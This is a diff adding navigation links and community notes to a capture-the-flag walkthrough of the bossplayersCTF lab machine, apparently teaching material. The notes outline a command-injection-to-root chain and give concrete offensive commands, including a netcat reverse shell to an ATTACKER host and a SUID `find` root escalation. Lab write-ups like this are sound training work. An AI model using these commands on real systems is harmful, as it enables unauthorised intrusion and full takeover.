@@ -13,6 +13,9 @@
 | **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
 | **Target OS** | Linux (Debian — Apache + PHP) |
 
+> ?? **Learning Path 1 ? Machine 6 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
+> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/06-bossplayersctf-1.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/06-bossplayersctf-1.md)** ? Previous in path: [Machine 5 ? Kioptrix: Level 1 (#1)](../3-046-kioptrix-level-1-1/README.md) ? Next in path: [Machine 7 ? Mr-Robot: 1](../3-053-mr-robot-1/README.md)
+
 Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.10`. Substitute your own values.
 
 ---
@@ -657,6 +660,23 @@ congratulations
 - GTFOBins — `find` — https://gtfobins.github.io/gtfobins/find/
 - pentestmonkey — Reverse Shell Cheat Sheet — https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - PayloadsAllTheThings — Command Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+
+
+### Community notes — consensus, pitfalls and alternative routes (cross-checked against the sources below):
+
+- **Consensus chain:** nmap (`22/80`) → page-source comment → three-layer base64 → `workinginprogress.php` → OS command injection at `?cmd=` → reverse shell → SUID `/usr/bin/find` → base64-encoded root flag.
+- **Common pitfall:** a raw payload in the query string is truncated at the first `&`; URL-encode it (`&`→`%26`, `>`→`%3E`, space→`%20`) instead of typing it.
+- **Common pitfall:** start the listener **before** firing the one-shot reverse shell, and ignore `robots.txt` — it is a decoy.
+- **Common pitfall:** `find . -exec …` only fires **per match** (an empty directory gives you nothing), `-quit` must come after `\;`, and a missing `-p` silently drops you back to `uid=33` with no `euid=0`.
+- **Alternative route:** the shell need not be the bash `/dev/tcp` one-liner — `nc -e /bin/bash ATTACKER PORT` (Hacking Articles) or Metasploit `exploit/multi/script/web_delivery` (PHP meterpreter, pasted into `?cmd=`, HackNos) work too; for privesc `find . -exec /bin/bash -p \; -quit` is equivalent. Enumeration may also start with a directory brute force (`dirb`/`dirbuster` → `robots.txt` + `/logs.php`, which Shendayan reports shows only the PHP version — no new lead) and with guessing the parameter name in Burp Repeater (Shendayan tried `ping`, `id`, … until `cmd` answered). One writeup mentions weighing hash cracking against the SUID shortcut and taking `find` instead.
+- **⚠️ Verification note — release metadata:** VulnHub's own release record lists **28 Sep 2019** and author **Cuong Nguyen**; the table's "September 2019" is taken directly from it and stands.
+- **⚠️ Verification note — difficulty and time:** Hacking Articles labels the box **"Intermediate"**, while VulnHub's description says it is "aimed at Beginner Security Professionals" and claims "around 30 minutes to root". The card keeps **Band 3 — Easy** and **3–4 hours** — the VulnHub figure assumes an experienced player, not a learner reading the theory first.
+- **⚠️ Verification note — target OS:** Shendayan's raw nmap output (`OpenSSH 7.9p1 Debian 10`, `Apache httpd 2.4.38 ((Debian))`) confirms the table row. Hacking Articles' prose once calls port 80 "Rocket httpd", which its own scan and every other writeup contradict — the table keeps Apache.
+- **⚠️ Verification note — page name:** HackNos types the page as `workingprogress.php` (missing "in") in two places; the base64 itself decodes to `workinginprogress.php` and Hacking Articles/Shendayan use that spelling — the card keeps `workinginprogress.php`.
+- **⚠️ Verification note — vulnerable PHP line:** no live writeup publishes the source of `workinginprogress.php`. Part A.1 therefore shows the **two shapes** this bug takes, and Step 4 infers this box's behaviour from observed outputs (a raw `?cmd=id` returns only `id`'s output; whole `nc`/`bash` payloads execute) — where the card says "something like", it means it.
+- **⚠️ Verification note — flag file:** `cd /root; ls; cat root.txt` → base64 → "congratulations" is confirmed independently by Hacking Articles and HackNos.
+- **⚠️ Verification note — dead sources:** the old Infosec Institute and D00MFist/Medium links were dead when re-checked (the Infosec article still answers **HTTP 403** to automated fetches); the **Verified sources** below are the live replacements used for this rewrite.
+- **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/) · [HackNos](https://www.hacknos.com/bossplayersctf-1-walkthrough-vulnhub/) · [Shendayan (GitHub Pages)](https://shendayan.github.io/CTF-Writeups/BossplayersCTF/EN.html)
 
 ---
 
